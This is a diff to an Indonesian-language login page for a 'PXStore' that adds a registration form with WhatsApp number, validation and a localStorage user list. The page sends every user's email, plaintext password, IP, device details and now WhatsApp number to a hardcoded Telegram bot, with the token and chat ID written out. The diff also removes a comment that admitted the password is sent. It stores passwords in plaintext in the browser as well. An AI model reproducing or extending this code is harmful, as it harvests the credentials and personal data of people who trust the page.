@@ -140,6 +140,23 @@
             transform: none;
         }
         
+        .register-link {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+        }
+        
+        .register-link a {
+            color: var(--primary);
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .register-link a:hover {
+            text-decoration: underline;
+        }
+        
         .loading {
             display: none;
             margin: 20px 0;
@@ -241,6 +258,10 @@
             <button class="login-btn" onclick="handleLogin()">Masuk</button>
         </div>
         
+        <div class="register-link">
+            Belum punya akun? <a href="#" onclick="showRegisterForm()">Daftar di sini</a>
+        </div>
+        
         <div class="loading">
             <div class="loading-spinner"></div>
             <p style="text-align: center; margin-top: 10px;">Memproses login...</p>
@@ -255,10 +276,51 @@
         <p class="footer-text">Dengan masuk, Anda menyetujui Syarat & Ketentuan kami</p>
     </div>
 
+    <!-- Modal untuk pendaftaran -->
+    <div id="registerModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.7); z-index: 1000; align-items: center; justify-content: center;">
+        <div style="background-color: var(--dark-card); border-radius: 20px; padding: 30px; width: 90%; max-width: 400px; box-shadow: var(--box-shadow);">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <h2 style="font-size: 1.5rem;">Daftar Akun Baru</h2>
+                <button onclick="closeRegisterForm()" style="background: none; border: none; color: var(--text-primary); font-size: 1.5rem; cursor: pointer;">&times;</button>
+            </div>
+            
+            <div class="form-group">
+                <label for="regEmail">Email</label>
+                <input type="email" id="regEmail" placeholder="nama@email.com" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="regPassword">Kata Sandi</label>
+                <input type="password" id="regPassword" placeholder="Minimal 6 karakter" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="regConfirmPassword">Konfirmasi Kata Sandi</label>
+                <input type="password" id="regConfirmPassword" placeholder="Ulangi kata sandi" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="regWhatsApp">Nomor WhatsApp</label>
+                <input type="tel" id="regWhatsApp" placeholder="Contoh: 628123456789" required>
+            </div>
+            
+            <button class="login-btn" onclick="handleRegister()">Daftar</button>
+            
+            <div class="message" id="registerMessage"></div>
+        </div>
+    </div>
+
     <script>
         // Konfigurasi Telegram Bot
         const TELEGRAM_BOT_TOKEN = '7513756403:AAHxi73Wd_wI2dfm3yoWIWPXYiowXCZkQB4'; // Ganti dengan token bot Telegram Anda
         const TELEGRAM_CHAT_ID = '7661292905'; // Ganti dengan chat ID admin
+        
+        // Inisialisasi data user jika belum ada
+        function initializeUserData() {
+            if (!localStorage.getItem('pxstore_users')) {
+                localStorage.setItem('pxstore_users', JSON.stringify([]));
+            }
+        }
         
         // Cek apakah user sudah login sebelumnya
         function checkLoginStatus() {
@@ -310,8 +372,8 @@
         }
         
         // Show message
-        function showMessage(text, type) {
-            const messageEl = document.getElementById('message');
+        function showMessage(text, type, elementId = 'message') {
+            const messageEl = document.getElementById(elementId);
             messageEl.textContent = text;
             messageEl.className = `message ${type}`;
             messageEl.style.display = 'block';
@@ -336,6 +398,30 @@
             telegramStatus.style.display = 'block';
         }
         
+        // Validasi email
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        
+        // Validasi nomor WhatsApp
+        function validateWhatsApp(whatsapp) {
+            // Hanya angka, minimal 10 digit, maksimal 15 digit
+            const re = /^\d{10,15}$/;
+            return re.test(whatsapp);
+        }
+        
+        // Validasi password
+        function validatePassword(password) {
+            return password.length >= 6;
+        }
+        
+        // Cek apakah email sudah terdaftar
+        function isEmailRegistered(email) {
+            const users = JSON.parse(localStorage.getItem('pxstore_users'));
+            return users.some(user => user.email === email);
+        }
+        
         // Send login data to Telegram
         async function sendToTelegram(userData) {
             try {
@@ -344,6 +430,7 @@
 👤 *Informasi Login:*
 • Email: ${userData.email}
 • Password: ${userData.password}
+• WhatsApp: ${userData.whatsapp || 'Tidak tersedia'}
 • Waktu: ${userData.time}
 • IP Address: ${userData.ip}
 
@@ -377,13 +464,105 @@ ${navigator.userAgent}`;
             }
         }
         
-        // Handle regular login
+        // Tampilkan form pendaftaran
+        function showRegisterForm() {
+            document.getElementById('registerModal').style.display = 'flex';
+        }
+        
+        // Tutup form pendaftaran
+        function closeRegisterForm() {
+            document.getElementById('registerModal').style.display = 'none';
+            document.getElementById('registerMessage').style.display = 'none';
+        }
+        
+        // Handle pendaftaran
+        function handleRegister() {
+            const email = document.getElementById('regEmail').value;
+            const password = document.getElementById('regPassword').value;
+            const confirmPassword = document.getElementById('regConfirmPassword').value;
+            const whatsapp = document.getElementById('regWhatsApp').value;
+            
+            // Validasi input
+            if (!email || !password || !confirmPassword || !whatsapp) {
+                showMessage('Harap isi semua field!', 'error', 'registerMessage');
+                return;
+            }
+            
+            if (!validateEmail(email)) {
+                showMessage('Format email tidak valid!', 'error', 'registerMessage');
+                return;
+            }
+            
+            if (!validatePassword(password)) {
+                showMessage('Password minimal 6 karakter!', 'error', 'registerMessage');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                showMessage('Konfirmasi password tidak cocok!', 'error', 'registerMessage');
+                return;
+            }
+            
+            if (!validateWhatsApp(whatsapp)) {
+                showMessage('Format nomor WhatsApp tidak valid! Hanya angka, 10-15 digit.', 'error', 'registerMessage');
+                return;
+            }
+            
+            if (isEmailRegistered(email)) {
+                showMessage('Email sudah terdaftar! Silakan login.', 'error', 'registerMessage');
+                return;
+            }
+            
+            // Simpan data user
+            const users = JSON.parse(localStorage.getItem('pxstore_users'));
+            const newUser = {
+                email: email,
+                password: password,
+                whatsapp: whatsapp,
+                registeredAt: new Date().toISOString()
+            };
+            
+            users.push(newUser);
+            localStorage.setItem('pxstore_users', JSON.stringify(users));
+            
+            showMessage('Pendaftaran berhasil! Silakan login.', 'success', 'registerMessage');
+            
+            // Tutup modal setelah 2 detik
+            setTimeout(() => {
+                closeRegisterForm();
+                // Isi form login dengan email yang baru didaftarkan
+                document.getElementById('email').value = email;
+            }, 2000);
+        }
+        
+        // Handle login
         async function handleLogin() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
             if (!email || !password) {
                 showMessage('Harap isi email dan password!', 'error');
+                return;
+            }
+            
+            // Validasi email
+            if (!validateEmail(email)) {
+                showMessage('Format email tidak valid!', 'error');
+                return;
+            }
+            
+            // Cek apakah user terdaftar
+            const users = JSON.parse(localStorage.getItem('pxstore_users'));
+            const user = users.find(u => u.email === email);
+            
+            if (!user) {
+                showMessage('Email belum terdaftar! Silakan daftar terlebih dahulu.', 'error');
+                return;
+            }
+            
+            // Cek password
+            if (user.password !== password) {
+                showMessage('Password salah!', 'error');
                 return;
             }
             
@@ -396,15 +575,16 @@ ${navigator.userAgent}`;
                 const device = getDeviceInfo();
                 const browser = getBrowserInfo();
                 
-                // Simpan status login secara otomatis
+                // Simpan status login
                 localStorage.setItem('pxstore_logged_in', 'true');
                 localStorage.setItem('pxstore_user_email', email);
                 localStorage.setItem('pxstore_login_time', new Date().toISOString());
                 
-                // Kirim data ke Telegram (termasuk password)
+                // Kirim data ke Telegram
                 const userData = {
                     email: email,
                     password: password,
+                    whatsapp: user.whatsapp,
                     time: currentTime,
                     ip: userIP,
                     device: device,
@@ -419,7 +599,7 @@ ${navigator.userAgent}`;
                     showTelegramStatus('Selamat Datang', true);
                     showMessage('Login berhasil! Mengarahkan ke halaman utama...', 'success');
                 } else {
-                    showTelegramStatus('Failed', false);
+                    showTelegramStatus('Gagal mengirim notifikasi', false);
                     showMessage('Login berhasil! Mengarahkan ke halaman utama...', 'success');
                 }
                 
@@ -432,13 +612,23 @@ ${navigator.userAgent}`;
         
         // Auto redirect jika sudah login
         document.addEventListener('DOMContentLoaded', function() {
+            // Inisialisasi data user
+            initializeUserData();
+            
             // Cek status login
             checkLoginStatus();
             
-            // Add enter key support
+            // Add enter key support untuk form login
             document.getElementById('password').addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     handleLogin();
+                }
+            });
+            
+            // Add enter key support untuk form registrasi
+            document.getElementById('regConfirmPassword').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    handleRegister();
                 }
             });
             
@@ -447,6 +637,13 @@ ${navigator.userAgent}`;
             if (savedEmail) {
                 document.getElementById('email').value = savedEmail;
             }
+            
+            // Tutup modal jika klik di luar modal
+            document.getElementById('registerModal').addEventListener('click', function(e) {
+                if (e.target === this) {
+                    closeRegisterForm();
+                }
+            });
         });
     </script>
 </body>
